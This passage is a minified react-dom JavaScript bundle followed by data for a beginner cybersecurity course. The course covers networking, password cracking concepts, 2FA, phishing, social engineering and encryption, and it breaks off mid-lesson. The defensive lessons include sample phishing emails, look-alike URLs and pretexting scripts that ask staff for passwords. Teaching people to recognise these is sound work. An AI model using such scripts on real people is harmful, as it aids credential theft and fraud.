e.stylesheets&&e.count===0&&ki(e,e.stylesheets),0<e.count||0<e.imgCount?function(l){var a=setTimeout(function(){if(e.stylesheets&&ki(e,e.stylesheets),e.unsuspend){var i=e.unsuspend;e.unsuspend=null,i()}},6e4+t);0<e.imgBytes&&us===0&&(us=62500*Ym());var n=setTimeout(function(){if(e.waitingForImages=!1,e.count===0&&(e.stylesheets&&ki(e,e.stylesheets),e.unsuspend)){var i=e.unsuspend;e.unsuspend=null,i()}},(e.imgBytes>us?50:800)+t);return e.unsuspend=l,function(){e.unsuspend=null,clearTimeout(a),clearTimeout(n)}}:null}function Ui(){if(this.count--,this.count===0&&(this.imgCount===0||!this.waitingForImages)){if(this.stylesheets)ki(this,this.stylesheets);else if(this.unsuspend){var e=this.unsuspend;this.unsuspend=null,e()}}}var Ri=null;function ki(e,t){e.stylesheets=null,e.unsuspend!==null&&(e.count++,Ri=new Map,t.forEach(cy,e),Ri=null,Ui.call(e))}function cy(e,t){if(!(t.state.loading&4)){var l=Ri.get(e);if(l)var a=l.get(null);else{l=new Map,Ri.set(e,l);for(var n=e.querySelectorAll("link[data-precedence],style[data-precedence]"),i=0;i<n.length;i++){var u=n[i];(u.nodeName==="LINK"||u.getAttribute("media")!=="not all")&&(l.set(u.dataset.precedence,u),a=u)}a&&l.set(null,a)}n=t.instance,u=n.getAttribute("data-precedence"),i=l.get(u)||a,i===a&&l.set(null,n),l.set(u,n),this.count++,a=Ui.bind(this),n.addEventListener("load",a),n.addEventListener("error",a),i?i.parentNode.insertBefore(n,i.nextSibling):(e=e.nodeType===9?e.head:e,e.insertBefore(n,e.firstChild)),t.state.loading|=4}}var Sn={$$typeof:C,Provider:null,Consumer:null,_currentValue:Y,_currentValue2:Y,_threadCount:0};function sy(e,t,l,a,n,i,u,s,o){this.tag=1,this.containerInfo=e,this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.next=this.pendingContext=this.context=this.cancelPendingCommit=null,this.callbackPriority=0,this.expirationTimes=tu(-1),this.entangledLanes=this.shellSuspendCounter=this.errorRecoveryDisabledLanes=this.expiredLanes=this.warmLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=tu(0),this.hiddenUpdates=tu(null),this.identifierPrefix=a,this.onUncaughtError=n,this.onCaughtError=i,this.onRecoverableError=u,this.pooledCache=null,this.pooledCacheLanes=0,this.formState=o,this.incompleteTransitions=new Map}function md(e,t,l,a,n,i,u,s,o,y,S,T){return e=new sy(e,t,l,u,o,y,S,T,s),t=1,i===!0&&(t|=24),i=dt(3,null,null,t),e.current=i,i.stateNode=e,t=Lu(),t.refCount++,e.pooledCache=t,t.refCount++,i.memoizedState={element:a,isDehydrated:l,cache:t},Xu(i),e}function yd(e){return e?(e=na,e):na}function pd(e,t,l,a,n,i){n=yd(n),a.context===null?a.context=n:a.pendingContext=n,a=sl(t),a.payload={element:l},i=i===void 0?null:i,i!==null&&(a.callback=i),l=ol(e,a,t),l!==null&&(ut(l,e,t),Fa(l,e,t))}function gd(e,t){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var l=e.retryLane;e.retryLane=l!==0&&l<t?l:t}}function cs(e,t){gd(e,t),(e=e.alternate)&&gd(e,t)}function vd(e){if(e.tag===13||e.tag===31){var t=Dl(e,67108864);t!==null&&ut(t,e,67108864),cs(e,67108864)}}function Sd(e){if(e.tag===13||e.tag===31){var t=gt();t=lu(t);var l=Dl(e,t);l!==null&&ut(l,e,t),cs(e,t)}}var Bi=!0;function oy(e,t,l,a){var n=g.T;g.T=null;var i=E.p;try{E.p=2,ss(e,t,l,a)}finally{E.p=i,g.T=n}}function fy(e,t,l,a){var n=g.T;g.T=null;var i=E.p;try{E.p=8,ss(e,t,l,a)}finally{E.p=i,g.T=n}}function ss(e,t,l,a){if(Bi){var n=os(a);if(n===null)Jc(e,t,a,Li,l),xd(e,a);else if(dy(n,e,t,l,a))a.stopPropagation();else if(xd(e,a),t&4&&-1<ry.indexOf(e)){for(;n!==null;){var i=Kl(n);if(i!==null)switch(i.tag){case 3:if(i=i.stateNode,i.current.memoizedState.isDehydrated){var u=zl(i.pendingLanes);if(u!==0){var s=i;for(s.pendingLanes|=2,s.entangledLanes|=2;u;){var o=1<<31-ft(u);s.entanglements[1]|=o,u&=~o}Ut(i),(re&6)===0&&(xi=st()+500,hn(0))}}break;case 31:case 13:s=Dl(i,2),s!==null&&ut(s,i,2),Ai(),cs(i,2)}if(i=os(a),i===null&&Jc(e,t,a,Li,l),i===n)break;n=i}n!==null&&a.stopPropagation()}else Jc(e,t,a,null,l)}}function os(e){return e=ru(e),fs(e)}var Li=null;function fs(e){if(Li=null,e=Zl(e),e!==null){var t=J(e);if(t===null)e=null;else{var l=t.tag;if(l===13){if(e=ce(t),e!==null)return e;e=null}else if(l===31){if(e=Te(t),e!==null)return e;e=null}else if(l===3){if(t.stateNode.current.memoizedState.isDehydrated)return t.tag===3?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null)}}return Li=e,null}function bd(e){switch(e){case"beforetoggle":case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"toggle":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 2;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 8;case"message":switch(Fd()){case Es:return 2;case zs:return 8;case Cn:case $d:return 32;case Cs:return 268435456;default:return 32}default:return 32}}var rs=!1,bl=null,xl=null,Tl=null,bn=new Map,xn=new Map,Al=[],ry="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(" ");function xd(e,t){switch(e){case"focusin":case"focusout":bl=null;break;case"dragenter":case"dragleave":xl=null;break;case"mouseover":case"mouseout":Tl=null;break;case"pointerover":case"pointerout":bn.delete(t.pointerId);break;case"gotpointercapture":case"lostpointercapture":xn.delete(t.pointerId)}}function Tn(e,t,l,a,n,i){return e===null||e.nativeEvent!==i?(e={blockedOn:t,domEventName:l,eventSystemFlags:a,nativeEvent:i,targetContainers:[n]},t!==null&&(t=Kl(t),t!==null&&vd(t)),e):(e.eventSystemFlags|=a,t=e.targetContainers,n!==null&&t.indexOf(n)===-1&&t.push(n),e)}function dy(e,t,l,a,n){switch(t){case"focusin":return bl=Tn(bl,e,t,l,a,n),!0;case"dragenter":return xl=Tn(xl,e,t,l,a,n),!0;case"mouseover":return Tl=Tn(Tl,e,t,l,a,n),!0;case"pointerover":var i=n.pointerId;return bn.set(i,Tn(bn.get(i)||null,e,t,l,a,n)),!0;case"gotpointercapture":return i=n.pointerId,xn.set(i,Tn(xn.get(i)||null,e,t,l,a,n)),!0}return!1}function Td(e){var t=Zl(e.target);if(t!==null){var l=J(t);if(l!==null){if(t=l.tag,t===13){if(t=ce(l),t!==null){e.blockedOn=t,ws(e.priority,function(){Sd(l)});return}}else if(t===31){if(t=Te(l),t!==null){e.blockedOn=t,ws(e.priority,function(){Sd(l)});return}}else if(t===3&&l.stateNode.current.memoizedState.isDehydrated){e.blockedOn=l.tag===3?l.stateNode.containerInfo:null;return}}}e.blockedOn=null}function Yi(e){if(e.blockedOn!==null)return!1;for(var t=e.targetContainers;0<t.length;){var l=os(e.nativeEvent);if(l===null){l=e.nativeEvent;var a=new l.constructor(l.type,l);fu=a,l.target.dispatchEvent(a),fu=null}else return t=Kl(l),t!==null&&vd(t),e.blockedOn=l,!1;t.shift()}return!0}function Ad(e,t,l){Yi(e)&&l.delete(t)}function hy(){rs=!1,bl!==null&&Yi(bl)&&(bl=null),xl!==null&&Yi(xl)&&(xl=null),Tl!==null&&Yi(Tl)&&(Tl=null),bn.forEach(Ad),xn.forEach(Ad)}function qi(e,t){e.blockedOn===t&&(e.blockedOn=null,rs||(rs=!0,j.unstable_scheduleCallback(j.unstable_NormalPriority,hy)))}var Gi=null;function Nd(e){Gi!==e&&(Gi=e,j.unstable_scheduleCallback(j.unstable_NormalPriority,function(){Gi===e&&(Gi=null);for(var t=0;t<e.length;t+=3){var l=e[t],a=e[t+1],n=e[t+2];if(typeof a!="function"){if(fs(a||l)===null)continue;break}var i=Kl(l);i!==null&&(e.splice(t,3),t-=3,oc(i,{pending:!0,data:n,method:l.method,action:a},a,n))}}))}function Ca(e){function t(o){return qi(o,e)}bl!==null&&qi(bl,e),xl!==null&&qi(xl,e),Tl!==null&&qi(Tl,e),bn.forEach(t),xn.forEach(t);for(var l=0;l<Al.length;l++){var a=Al[l];a.blockedOn===e&&(a.blockedOn=null)}for(;0<Al.length&&(l=Al[0],l.blockedOn===null);)Td(l),l.blockedOn===null&&Al.shift();if(l=(e.ownerDocument||e).$$reactFormReplay,l!=null)for(a=0;a<l.length;a+=3){var n=l[a],i=l[a+1],u=n[et]||null;if(typeof i=="function")u||Nd(l);else if(u){var s=null;if(i&&i.hasAttribute("formAction")){if(n=i,u=i[et]||null)s=u.formAction;else if(fs(n)!==null)continue}else s=u.action;typeof s=="function"?l[a+1]=s:(l.splice(a,3),a-=3),Nd(l)}}}function jd(){function e(i){i.canIntercept&&i.info==="react-transition"&&i.intercept({handler:function(){return new Promise(function(u){return n=u})},focusReset:"manual",scroll:"manual"})}function t(){n!==null&&(n(),n=null),a||setTimeout(l,20)}function l(){if(!a&&!navigation.transition){var i=navigation.currentEntry;i&&i.url!=null&&navigation.navigate(i.url,{state:i.getState(),info:"react-transition",history:"replace"})}}if(typeof navigation=="object"){var a=!1,n=null;return navigation.addEventListener("navigate",e),navigation.addEventListener("navigatesuccess",t),navigation.addEventListener("navigateerror",t),setTimeout(l,100),function(){a=!0,navigation.removeEventListener("navigate",e),navigation.removeEventListener("navigatesuccess",t),navigation.removeEventListener("navigateerror",t),n!==null&&(n(),n=null)}}}function ds(e){this._internalRoot=e}Xi.prototype.render=ds.prototype.render=function(e){var t=this._internalRoot;if(t===null)throw Error(h(409));var l=t.current,a=gt();pd(l,a,e,t,null,null)},Xi.prototype.unmount=ds.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var t=e.containerInfo;pd(e.current,2,null,e,null,null),Ai(),t[Vl]=null}};function Xi(e){this._internalRoot=e}Xi.prototype.unstable_scheduleHydration=function(e){if(e){var t=Hs();e={blockedOn:null,target:e,priority:t};for(var l=0;l<Al.length&&t!==0&&t<Al[l].priority;l++);Al.splice(l,0,e),l===0&&Td(e)}};var Ed=X.version;if(Ed!=="19.2.4")throw Error(h(527,Ed,"19.2.4"));E.findDOMNode=function(e){var t=e._reactInternals;if(t===void 0)throw typeof e.render=="function"?Error(h(188)):(e=Object.keys(e).join(","),Error(h(268,e)));return e=x(t),e=e!==null?ae(e):null,e=e===null?null:e.stateNode,e};var my={bundleType:0,version:"19.2.4",rendererPackageName:"react-dom",currentDispatcherRef:g,reconcilerVersion:"19.2.4"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var Qi=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!Qi.isDisabled&&Qi.supportsFiber)try{_a=Qi.inject(my),ot=Qi}catch{}}return Nn.createRoot=function(e,t){if(!U(e))throw Error(h(299));var l=!1,a="",n=Hf,i=wf,u=Uf;return t!=null&&(t.unstable_strictMode===!0&&(l=!0),t.identifierPrefix!==void 0&&(a=t.identifierPrefix),t.onUncaughtError!==void 0&&(n=t.onUncaughtError),t.onCaughtError!==void 0&&(i=t.onCaughtError),t.onRecoverableError!==void 0&&(u=t.onRecoverableError)),t=md(e,1,!1,null,null,l,a,null,n,i,u,jd),e[Vl]=t.current,Kc(e),new ds(t)},Nn.hydrateRoot=function(e,t,l){if(!U(e))throw Error(h(299));var a=!1,n="",i=Hf,u=wf,s=Uf,o=null;return l!=null&&(l.unstable_strictMode===!0&&(a=!0),l.identifierPrefix!==void 0&&(n=l.identifierPrefix),l.onUncaughtError!==void 0&&(i=l.onUncaughtError),l.onCaughtError!==void 0&&(u=l.onCaughtError),l.onRecoverableError!==void 0&&(s=l.onRecoverableError),l.formState!==void 0&&(o=l.formState)),t=md(e,1,!0,t,l??null,a,n,o,i,u,s,jd),t.context=yd(null),l=t.current,a=gt(),a=lu(a),n=sl(a),n.callback=null,ol(l,n,a),l=a,t.current.lanes=l,Da(t,l),Ut(t),e[Vl]=t.current,Kc(e),new Xi(t)},Nn.version="19.2.4",Nn}var Rd;function Ny(){if(Rd)return ys.exports;Rd=1;function j(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(j)}catch(X){console.error(X)}}return j(),ys.exports=Ay(),ys.exports}var jy=Ny();const Ct={title:"Cybersecurity",subtitle:"Learn to protect yourself and hack ethically",chapters:[{id:1,title:"Welcome to Cybersecurity",description:"What hackers do and why it matters",lessons:[{id:"1-1",title:"What is Cybersecurity?",duration:"8 min",content:`
## Welcome, Future Cyber Defender! 🛡️

Every day, hackers attack millions of computers, phones, and websites. **Cybersecurity** is the art of defending against these attacks — and understanding how they work.

### Why Should You Care?

Think about everything connected to the internet:
- Your phone 📱
- Your gaming console 🎮
- Smart TVs, cameras, doorbells 📷
- Cars, hospitals, power plants ⚡

ALL of these can be hacked. And someone needs to protect them.

### The Three Types of Hackers

| Type | Also Called | What They Do |
|------|-----------|-------------|
| **White Hat** | Ethical Hacker | Gets paid to find & fix security holes |
| **Black Hat** | Criminal Hacker | Breaks into systems illegally |
| **Gray Hat** | Somewhere in between | Finds bugs without permission, but reports them |

### What You'll Learn

In this course, you'll think like a hacker (the good kind!):

✅ How passwords get cracked
✅ How websites get hacked
✅ How to spot phishing scams
✅ How to protect your accounts
✅ How encryption works
✅ How to analyze network traffic
✅ Real hacking tools (used ethically!)

### The CIA Triad

The foundation of all cybersecurity:

- **C**onfidentiality — Only authorized people see the data
- **I**ntegrity — Data hasn't been tampered with
- **A**vailability — Systems are up and running when needed

\`\`\`
       Confidentiality
           /\\
          /  \\
         /    \\
        /  CIA  \\
       /________\\
  Integrity    Availability
\`\`\`

Every security decision balances these three goals.

### Real-World Cyber Attacks

| Attack | Year | What Happened |
|--------|------|--------------|
| Yahoo Breach | 2013 | 3 billion accounts stolen |
| WannaCry | 2017 | Ransomware hit 200,000 computers |
| SolarWinds | 2020 | Hackers infiltrated US government |
| Colonial Pipeline | 2021 | Shut down fuel supply for days |

<tip>
💡 Cybersecurity jobs pay $80,000-$200,000+ and there's a massive shortage of skilled workers!
</tip>

### The Golden Rule

**Never hack anything you don't have permission to hack.**

This course teaches you skills for defense and ethical hacking ONLY. Using these skills illegally can land you in serious trouble.

Ready to become a cyber defender? Let's go! 🚀
          `},{id:"1-2",title:"How the Internet Actually Works",duration:"10 min",content:`
## Under the Hood of the Internet 🌐

To defend the internet, you need to understand how it works!

### IP Addresses — Your Digital Address

Every device on the internet has an **IP address**:

\`\`\`
Your computer:  192.168.1.100  (private/local)
Google's server: 142.250.80.46  (public)
\`\`\`

**IPv4**: 4 numbers, 0-255 each → \`192.168.1.1\`
**IPv6**: Longer, newer format → \`2001:0db8:85a3::8a2e:0370:7334\`

### DNS — The Internet's Phone Book

When you type \`google.com\`, your computer asks a **DNS server**: "What's the IP for google.com?"

\`\`\`
You → "What IP is google.com?"
DNS → "It's 142.250.80.46"
You → connects to 142.250.80.46
\`\`\`

\`\`\`bash
# Try it yourself! Open terminal and type:
nslookup google.com

# Or:
ping google.com
\`\`\`

### Ports — Doors Into a Computer

Each computer has **65,535 ports**. Think of them as doors:

| Port | Service | What It Does |
|------|---------|-------------|
| 80 | HTTP | Regular websites |
| 443 | HTTPS | Secure websites |
| 22 | SSH | Remote access |
| 25 | SMTP | Email sending |
| 3306 | MySQL | Databases |

<warning>
⚠️ Open ports are like unlocked doors — hackers scan for them!
</warning>

### HTTP vs HTTPS

\`\`\`
HTTP  = Sending a postcard (anyone can read it)
HTTPS = Sending a sealed letter (encrypted!)
\`\`\`

Always check for the 🔒 lock icon in your browser!

### Packets — How Data Travels

Data doesn't travel as one big file. It's broken into **packets**:

\`\`\`
Your message: "Hello World!"

Split into packets:
[Packet 1] "Hel" → Route A → ✓
[Packet 2] "lo "  → Route B → ✓
[Packet 3] "Wor" → Route A → ✓
[Packet 4] "ld!" → Route C → ✓

Reassembled: "Hello World!"
\`\`\`

Each packet contains:
- **Source IP** — Where it came from
- **Destination IP** — Where it's going
- **Data** — The actual content
- **Checksum** — Verify it wasn't corrupted

### The OSI Model (Simplified)

\`\`\`
7. Application  ← You interact here (browser, email)
6. Presentation ← Data formatting (encryption)
5. Session      ← Connection management
4. Transport    ← TCP/UDP (reliable delivery)
3. Network      ← IP addresses, routing
2. Data Link    ← MAC addresses, switches
1. Physical     ← Cables, Wi-Fi signals
\`\`\`

<tip>
💡 Hackers can attack at ANY layer. That's why security needs to cover all of them!
</tip>

### Try It: See Your Network Info

\`\`\`bash
# Windows
ipconfig

# Mac/Linux
ifconfig
# or
ip addr

# See your public IP
curl ifconfig.me
\`\`\`

Understanding networking is the foundation of cybersecurity! 🎯
          `}]},{id:2,title:"Passwords & Authentication",description:"How passwords get cracked and how to stay safe",lessons:[{id:"2-1",title:"How Passwords Get Cracked",duration:"12 min",content:`
## Password Cracking 101 🔓

Passwords are the #1 way we protect accounts. And the #1 thing hackers target.

### How Passwords Are Stored

Websites DON'T store your actual password (usually). They store a **hash**:

\`\`\`
Your password: "minecraft123"
        ↓ Hash Function (SHA-256)
Stored hash: "a1b2c3d4e5f6789..."
\`\`\`

A hash is a one-way function — you can't reverse it to get the password back.

\`\`\`python
# Python example of hashing
import hashlib

password = "minecraft123"
hashed = hashlib.sha256(password.encode()).hexdigest()
print(hashed)
# Output: a1b2c3d4e5f6... (always the same for same input!)
\`\`\`

### Attack #1: Brute Force

Try EVERY possible combination:

\`\`\`
Trying: a        ✗
Trying: b        ✗
Trying: c        ✗
...
Trying: aa       ✗
Trying: ab       ✗
...
(This takes forever for long passwords!)
\`\`\`

| Password Length | Possible Combos | Time to Crack |
|----------------|----------------|--------------|
| 4 characters | 14 million | Instant |
| 6 characters | 19 billion | Seconds |
| 8 characters | 6 trillion | Hours |
| 12 characters | 95 sextillion | Centuries |
| 16 characters | ... | Heat death of universe |

### Attack #2: Dictionary Attack

Use a list of common passwords:

\`\`\`
password       ✗
123456         ✗
qwerty         ✗
minecraft123   ✓ FOUND!
\`\`\`

### The Most Common Passwords (DON'T use these!)

1. 123456
2. password
3. 123456789
4. qwerty
5. abc123
6. password1
7. iloveyou
8. 12345678

<warning>
⚠️ If your password is on this list, change it RIGHT NOW!
</warning>

### Attack #3: Rainbow Tables

Pre-computed hashes for millions of passwords:

\`\`\`
"password"    → 5e884898da28047...
"123456"      → 8d969eef6ecad3c...
"minecraft"   → 7c9e7c1b2d4f8a1...
\`\`\`

Hackers just look up the hash! That's why websites use **salting**:

\`\`\`
password + random_salt → unique_hash
"minecraft" + "x7k2" → "completely_different_hash"
"minecraft" + "p9m1" → "another_different_hash"
\`\`\`

Same password, different salt = different hash. Rainbow tables become useless!

### Attack #4: Credential Stuffing

1. Hacker gets leaked passwords from Site A
2. Tries same email/password on Site B, C, D...
3. People reuse passwords → accounts get hacked

<tip>
💡 This is why you should NEVER reuse passwords across different sites!
</tip>

### How to Make Strong Passwords

**Bad:** \`minecraft123\` (dictionary word + numbers)
**Better:** \`M!n3cr@ft_2024!\` (substitutions)
**Best:** \`correct-horse-battery-staple\` (passphrase!)

Passphrases are:
- Easy to remember
- Hard to crack
- Long = more secure

\`\`\`
4 random words = 20+ characters = extremely secure
"purple-elephant-dancing-tuesday"
\`\`\`

You now understand how hackers crack passwords! 🎓
          `},{id:"2-2",title:"Two-Factor Authentication",duration:"8 min",content:`
## The Extra Lock on Your Door 🔐

Even the strongest password can be stolen. That's where **2FA** comes in!

### What is 2FA?

Two-Factor Authentication requires TWO things to log in:

\`\`\`
Factor 1: Something you KNOW (password)
    +
Factor 2: Something you HAVE (phone/key)
    =
Much harder to hack!
\`\`\`

### Types of 2FA

| Method | Security | Convenience |
|--------|----------|------------|
| SMS Code | ⭐⭐ | ⭐⭐⭐⭐⭐ |
| Authenticator App | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| Hardware Key (YubiKey) | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ |
| Biometric (fingerprint) | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |

### Why SMS 2FA is Weak

**SIM Swapping Attack:**
1. Hacker calls your phone carrier
2. Pretends to be you
3. Transfers your number to their SIM
4. Now THEY get your SMS codes!

\`\`\`
Hacker: "Hi, I lost my phone. Can you transfer 
         my number to this new SIM?"
Carrier: "Sure! What's your mother's maiden name?"
Hacker: (found it on social media) "Smith"
Carrier: "Done!"
Your 2FA codes: → Hacker's phone 😱
\`\`\`

### Authenticator Apps (Recommended!)

Apps like **Google Authenticator** or **Authy** generate codes that change every 30 seconds:

\`\`\`
Your app shows: 847 291
                ████████░░ (25 seconds left)

After 30 seconds: 163 502
                  ██░░░░░░░░ (new code!)
\`\`\`

### How TOTP Works

\`\`\`
Secret Key (shared once) + Current Time
        ↓
    HMAC Algorithm
        ↓
    6-digit code
\`\`\`

\`\`\`python
# Simplified TOTP concept
import time
import hashlib

secret = "JBSWY3DPEHPK3PXP"
time_step = int(time.time() / 30)  # Changes every 30 sec
code = hashlib.sha1(f"{secret}{time_step}".encode()).hexdigest()[-6:]
print(f"Your code: {code}")
\`\`\`

### Hardware Security Keys

Physical USB keys (like YubiKey):
- Plug in and tap to authenticate
- **Impossible** to phish remotely
- Used by Google employees (zero phishing since adoption!)

### Set Up 2FA NOW!

Priority accounts to protect:
1. **Email** (password reset for everything!)
2. **Banking/Financial**
3. **Social Media**
4. **Gaming accounts** (Steam, etc.)

<tip>
💡 Always save your **backup codes** when setting up 2FA! Store them somewhere safe offline.
</tip>

### Password Managers

Use one to generate and store unique passwords:
- **Bitwarden** (free, open source)
- **1Password** (paid, great UI)
- **KeePass** (free, local only)

\`\`\`
Without manager: Same password everywhere 😰
With manager: Unique 24-char password per site 💪
\`\`\`

You only need to remember ONE master password!

Enable 2FA on everything. It's the single best thing you can do for security! 🔐
          `}]},{id:3,title:"Social Engineering",description:"Hacking the human mind",lessons:[{id:"3-1",title:"Phishing Attacks",duration:"10 min",content:`
## The Art of Deception 🎣

The easiest way to hack someone? **Ask them for their password.** Seriously.

### What is Phishing?

Fake emails/messages that trick you into giving up information:

\`\`\`
From: security@amaz0n.com  ← Notice the ZERO!
Subject: Your account has been compromised!

Dear Customer,

We detected suspicious activity. Click here to 
verify your identity immediately or your account 
will be suspended in 24 hours!

[VERIFY NOW] ← Links to fake-amazon-login.com
\`\`\`

### Spot the Red Flags 🚩

1. **Urgency** — "Act NOW or else!"
2. **Fear** — "Your account is compromised!"
3. **Bad sender** — \`security@amaz0n.com\` (not amazon.com)
4. **Suspicious links** — Hover before clicking!
5. **Grammar errors** — "Dear Valued Customers"
6. **Generic greeting** — "Dear Customer" not your name
7. **Too good to be true** — "You won $1,000,000!"

### Types of Phishing

| Type | Target | Example |
|------|--------|---------|
| **Phishing** | Anyone | Mass fake emails |
| **Spear Phishing** | Specific person | Researched, personalized |
| **Whaling** | CEO/executives | High-value targets |
| **Smishing** | Via SMS | "Your package is delayed" |
| **Vishing** | Via phone call | "This is the IRS..." |

### Real Phishing Examples

**Fake Login Page:**
\`\`\`
Real:  https://accounts.google.com/login
Fake:  https://accounts.g00gle.com/login  ← zeros!
Fake:  https://google-accounts-login.com  ← wrong domain!
Fake:  https://accounts.google.com.evil.com/login ← subdomain trick!
\`\`\`

**URL Anatomy:**
\`\`\`
https://accounts.google.com.evil.com/login
         ↑                    ↑
    looks legit          ACTUAL domain is evil.com!
\`\`\`

<warning>
⚠️ Always check the ACTUAL domain — it's the part right before .com/.org/.net!
</warning>

### How to Check a Suspicious Email

\`\`\`
1. Don't click any links!
2. Check the sender's FULL email address
3. Hover over links to see real URL
4. Look for urgency/fear tactics
5. When in doubt, go directly to the website
   (type it yourself, don't click the link)
\`\`\`

### Phishing Quiz

Which URL is real?

\`\`\`
A) https://www.paypal.com/login
B) https://www.paypa1.com/login
C) https://paypal.secure-login.com
D) https://www.paypal.com.verify.net/login
\`\`\`

Answer: **A** — it's the only one with the real paypal.com domain!

<tip>
💡 When in doubt, NEVER click email links. Open your browser and type the website address yourself!
</tip>

### Social Media Phishing

Hackers use info from your profiles to make convincing attacks:

\`\`\`
Public info they find:
- Your school name
- Your pet's name
- Your birthday
- Your friends list
- Where you work

They use this to:
- Guess security questions
- Create targeted phishing
- Impersonate your friends
\`\`\`

Stay skeptical! If something feels off, it probably is. 🎯
          `},{id:"3-2",title:"Social Engineering Tactics",duration:"10 min",content:`
## Hacking Without Code 🧠

**Social engineering** is manipulating people into breaking security. No code needed!

### The 6 Principles of Influence

Hackers exploit these psychological principles:

**1. Authority**
\`\`\`
"Hi, I'm from the IT department. I need your 
password to fix a critical issue."
→ People obey authority figures
\`\`\`

**2. Urgency**
\`\`\`
"Your account will be deleted in 1 HOUR unless 
you verify RIGHT NOW!"
→ Panic overrides critical thinking
\`\`\`

**3. Social Proof**
\`\`\`
"Everyone in your department has already updated 
their passwords using this link."
→ If others did it, it must be safe
\`\`\`

**4. Reciprocity**
\`\`\`
"I helped fix your computer last week, remember? 
I just need a small favor..."
→ We feel obligated to return favors
\`\`\`

**5. Liking**
\`\`\`
"Hey! We met at the conference, right? Great 
presentation! By the way..."
→ We trust people we like
\`\`\`

**6. Scarcity**
\`\`\`
"Only the first 10 people get free access! 
Click now before it's gone!"
→ Fear of missing out
\`\`\`

### Real Attack: Tailgating

Following someone through a locked door:

\`\`\`
*Employee badges into building*
Hacker: "Oh hey, can you hold the door? 
         My hands are full!" 📦
Employee: "Sure!"
Hacker: *walks right into secure building*
\`\`\`

### Real Attack: Pretexting

Creating a fake scenario:

\`\`\`
Hacker calls reception:
"Hi, I'm from Cisco doing a network audit. 
I need the admin password for router 
configuration check."

Receptionist: "Oh, let me ask... 
The admin password is 'cisco123'"
\`\`\`

### Real Attack: Baiting

Leaving infected USB drives in parking lots:

\`\`\`
*Employee finds USB labeled "Salary Data 2024"*
Employee: "Ooh, interesting!" *plugs it in*
USB: *installs malware* 😈
\`\`\`

<warning>
⚠️ NEVER plug in USB drives you find! They could contain malware that runs automatically.
</warning>

### Real Attack: Quid Pro Quo

\`\`\`
Hacker calls employees randomly:
"Hi, I'm tech support. Are you having 
any computer problems?"

Employee: "Actually, yes! My email is slow."

Hacker: "I can fix that! Just install this 
remote access tool and give me your login..."
\`\`\`

### Defense Strategies

\`\`\`
✅ Verify identity independently
   (Call them back on a known number)

✅ Never give passwords over phone/email
   (IT will NEVER ask for your password)

✅ Question urgency
   ("Let me verify this first")

✅ Be suspicious of unsolicited help

✅ Report suspicious contacts
\`\`\`

<tip>
💡 The best defense against social engineering is awareness. Now that you know these tricks, they're much less likely to work on you!
</tip>

### Try This: Social Engineering Awareness

Next time you get a suspicious email or message:
1. Identify which principle(s) of influence it uses
2. Find the red flags
3. Think about what the attacker wants

Practice makes you harder to hack! 🛡️
          `}]},{id:4,title:"Encryption & Cryptography",description:"The math that keeps secrets safe",lessons:[{id:"4-1",title:"Encryption Basics",duration:"12 min",content:`
## Secret Messages 🔐

Encryption turns readable text into unreadable gibberish — and back again!

### Plaintext vs Ciphertext

\`\`\`
Plaintext:  "HELLO WORLD"     (readable)
     ↓ Encrypt with key
Ciphertext: "KHOOR ZRUOG"     (gibberish)
     ↓ Decrypt with key
Plaintext:  "HELLO WORLD"     (readable again!)
\`\`\`

### Caesar Cipher (The Oldest Encryption)

Shift each letter by N positions:

\`\`\`
Key: Shift by 3

A → D    H → K
B → E    E → H
C → F    L → O
...      O → R

HELLO → KHOOR
\`\`\`

\`\`\`python
# Caesar Cipher in Python
def caesar_encrypt(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            result += chr((ord(char) - base + shift) % 26 + base)
        else:
            result += char
    return result

# Encrypt
secret = caesar_encrypt("HELLO WORLD", 3)
print(secret)  # KHOOR ZRUOG

# Decrypt (shift backwards)
original = caesar_encrypt(secret, -3)
print(original)  # HELLO WORLD
\`\`\`

### Why Caesar Cipher is Weak

Only 26 possible shifts — try them all!

\`\`\`
KHOOR → shift 1  → JGNNQ  ✗
KHOOR → shift 2  → IFMMP  ✗
KHOOR → shift 3  → HELLO  ✓ Found it!
\`\`\`

### Symmetric Encryption

Same key to encrypt AND decrypt:

\`\`\`
    Key: "mysecretkey"
         ↓
Alice ──[Encrypt]──→ Ciphertext ──[Decrypt]──→ Bob
         ↑                                      ↑
    Uses same key                          Uses same key
\`\`\`

Modern symmetric algorithms:
- **AES** (Advanced Encryption Standard) — The gold standard
- **ChaCha20** — Fast, used in HTTPS

### Asymmetric Encryption (Public Key)

TWO different keys — a public key and a private key:

\`\`\`
Bob has:
  🔑 Public Key  (shared with everyone)
